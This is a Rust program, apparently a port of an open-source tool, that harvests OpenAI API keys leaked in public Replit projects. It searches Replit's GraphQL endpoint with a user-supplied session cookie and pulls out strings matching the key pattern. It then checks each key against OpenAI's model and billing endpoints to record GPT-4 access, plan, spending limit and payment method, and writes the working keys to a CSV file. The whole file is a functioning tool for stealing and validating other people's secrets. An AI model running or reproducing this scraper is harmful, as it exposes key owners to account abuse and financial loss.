use reqwest::{self, header::{HeaderMap, HeaderValue}};
use serde_json::{json, Value};
use std::{env, fs::{self, File}, io::{self, Write}, time::{SystemTime, UNIX_EPOCH}, collections::HashSet};
use regex::Regex;
use csv::{Writer, ReaderBuilder};
use std::error::Error;
use tokio;
use std::future::Future;
use std::pin::Pin;

const COPYRIGHT_NOTICE: &str = r#"
COPYRIGHT NOTICE:

ading2210/openai-key-scraper: a Rust port of the Python script to scrape OpenAI API keys that are exposed on public Replit projects
Copyright (C) 2023 ading2210

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"#;

const GRAPHQL_URL: &str = "https://replit.com/graphql";

#[derive(Debug, serde::Serialize)]
struct KeyInfo {
    key: String,
    gpt4_allowed: bool,
    plan: String,
    limit: f64,
    payment_method: bool,
    expiration: u64,
}

async fn get_headers(cookie: &str) -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert("User-Agent", HeaderValue::from_static("Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"));
    headers.insert("Accept", HeaderValue::from_static("*/*"));
    headers.insert("Accept-Language", HeaderValue::from_static("en-US,en;q=0.5"));
    headers.insert("Content-Type", HeaderValue::from_static("application/json"));
    headers.insert("x-requested-with", HeaderValue::from_static("XMLHttpRequest"));
    headers.insert("Sec-Fetch-Dest", HeaderValue::from_static("empty"));
    headers.insert("Sec-Fetch-Mode", HeaderValue::from_static("cors"));
    headers.insert("Sec-Fetch-Site", HeaderValue::from_static("same-origin"));
    headers.insert("Pragma", HeaderValue::from_static("no-cache"));
    headers.insert("Cache-Control", HeaderValue::from_static("no-cache"));
    headers.insert("Referrer", HeaderValue::from_static("https://replit.com/search"));
    headers.insert("Cookie", HeaderValue::from_str(cookie).unwrap());
    headers
}

fn perform_search(
    client: &reqwest::Client,
    headers: &HeaderMap,
    query: &str,
    page: i32,
) -> Pin<Box<dyn Future<Output = Result<Vec<String>, Box<dyn Error>>> + '_>> {
    Box::pin(async move {
        let graphql_query = fs::read_to_string("graphql/SearchPageSearchResults.graphql")?;
        
        let payload = json!([{
            "operationName": "SearchPageSearchResults",
            "variables": {
                "options": {
                    "onlyCalculateHits": false,
                    "categories": ["Files"],
                    "query": query,
                    "categorySettings": {
                        "docs": {},
                        "files": {
                            "page": {
                                "first": 10,
                                "after": page.to_string()
                            },
                            "sort": "RecentlyModified",
                            "exactMatch": false,
                            "myCode": false
                        }
                    }
                }
            },
            "query": graphql_query
        }]);

        let response = client.post(GRAPHQL_URL)
            .headers(headers.clone())
            .json(&payload)
            .send()
            .await?
            .json::<Value>()
            .await?;

        let search = &response[0]["data"]["search"];
        
        if !search.get("fileResults").is_some() {
            if let Some(message) = search.get("message") {
                println!("Replit returned an error. Retrying in 5 seconds...");
                println!("{}", message);
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
                return perform_search(client, headers, query, page).await;
            }
            return Ok(vec![]);
        }

        let file_results = search["fileResults"]["results"]["items"].as_array().unwrap();
        let key_regex = Regex::new(r"sk-[a-zA-Z0-9]{48}").unwrap();
        let mut found_keys = HashSet::new();

        for result in file_results {
            if let Some(contents) = result["fileContents"].as_str() {
                for cap in key_regex.find_iter(contents) {
                    found_keys.insert(cap.as_str().to_string());
                }
            }
        }

        Ok(found_keys.into_iter().collect())
    })
}

async fn validate_key(client: &reqwest::Client, key: &str) -> Option<KeyInfo> {
    let validation_url = "https://api.openai.com/v1/models/gpt-4";
    let subscription_url = "https://api.openai.com/v1/dashboard/billing/subscription";
    
    let mut headers = HeaderMap::new();
    headers.insert("Authorization", HeaderValue::from_str(&format!("Bearer {}", key)).unwrap());

    let validation_response = client.get(validation_url)
        .headers(headers.clone())
        .send()
        .await
        .unwrap();

    if validation_response.status() == 401 {
        return None;
    }
    
    let gpt4_allowed = validation_response.status() != 404;
    
    let subscription = client.get(subscription_url)
        .headers(headers)
        .send()
        .await
        .unwrap()
        .json::<Value>()
        .await
        .unwrap();

    let expiration = subscription["access_until"].as_i64().unwrap() as u64;
    let current_time = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
    
    if expiration < current_time {
        return None;
    }

    let hard_limit = subscription["hard_limit_usd"].as_f64()
        .or(subscription["system_hard_limit_usd"].as_f64())
        .unwrap_or(0.0);
    
    let plan_id = subscription["plan"]["id"].as_str().unwrap_or("unknown").to_string();
    let payment_method = subscription["has_payment_method"].as_bool().unwrap_or(false);

    Some(KeyInfo {
        key: key.to_string(),
        gpt4_allowed,
        plan: plan_id,
        limit: hard_limit,
        payment_method,
        expiration,
    })
}

fn log_key(key_info: &KeyInfo) -> Result<(), Box<dyn Error>> {
    let file_exists = std::path::Path::new("found_keys.csv").exists();
    let mut writer = Writer::from_writer(fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open("found_keys.csv")?);

    if !file_exists {
        writer.write_record(&["key", "gpt4_allowed", "plan", "limit", "payment_method", "expiration"])?;
    }

    writer.write_record(&[
        &key_info.key,
        &key_info.gpt4_allowed.to_string(),
        &key_info.plan,
        &key_info.limit.to_string(),
        &key_info.payment_method.to_string(),
        &key_info.expiration.to_string(),
    ])?;
    
    writer.flush()?;
    Ok(())
}

async fn search_all_pages(client: &reqwest::Client, headers: &HeaderMap, query: &str) -> Result<Vec<String>, Box<dyn Error>> {
    let mut found_keys = HashSet::new();
    let mut valid_keys = Vec::new();

    // Load known keys
    let mut known_keys = HashSet::new();
    if std::path::Path::new("found_keys.csv").exists() {
        let file = File::open("found_keys.csv")?;
        let reader = ReaderBuilder::new().has_headers(true).from_reader(file);
        for result in reader.into_records() {
            if let Ok(record) = result {
                known_keys.insert(record[0].to_string());
            }
        }
    }

    for page in 1..21 {
        println!("Checking page {}...", page);
        let keys = perform_search(client, headers, query, page).await?;
        println!("Found {} matches (not validated)", keys.len());

        for key in keys {
            if found_keys.contains(&key) || known_keys.contains(&key) {
                if known_keys.contains(&key) {
                    println!("Found working key (cached): {}", key);
                }
                continue;
            }

            if let Some(key_info) = validate_key(client, &key).await {
                valid_keys.push(key.clone());
                log_key(&key_info)?;
                println!(
                    "Found working key: {} (gpt4: {}, plan: {}, limit: {}, payment method: {}, expiration: {})",
                    key_info.key, key_info.gpt4_allowed, key_info.plan, key_info.limit, 
                    key_info.payment_method, key_info.expiration
                );
            }

            found_keys.insert(key);
        }
    }

    Ok(valid_keys)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    println!("{}", COPYRIGHT_NOTICE);
    print!("\n======\n\nHit enter to continue and to confirm that you have read the copyright notice for this program. ");
    io::stdout().flush()?;
    let mut buffer = String::new();
    io::stdin().read_line(&mut buffer)?;
    println!("\n======\n");

    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Cookie not provided. Pass in your cookie as the next argument. Like 'cargo run -- \"cookie_here\"'");
        std::process::exit(1);
    }

    let cookie = &args[1];
    let query = if args.len() > 2 {
        &args[2]
    } else {
        println!("Warning: search query not provided, falling back to hard coded default");
        "sk- openai"
    };

    println!("Searching with query: {}", query);
    
    let client = reqwest::Client::new();
    let headers = get_headers(cookie).await;
    let keys = search_all_pages(&client, &headers, query).await?;
    
    println!("Search complete. Found {} valid keys. Check found_keys.csv for results.", keys.len());
    Ok(())
}
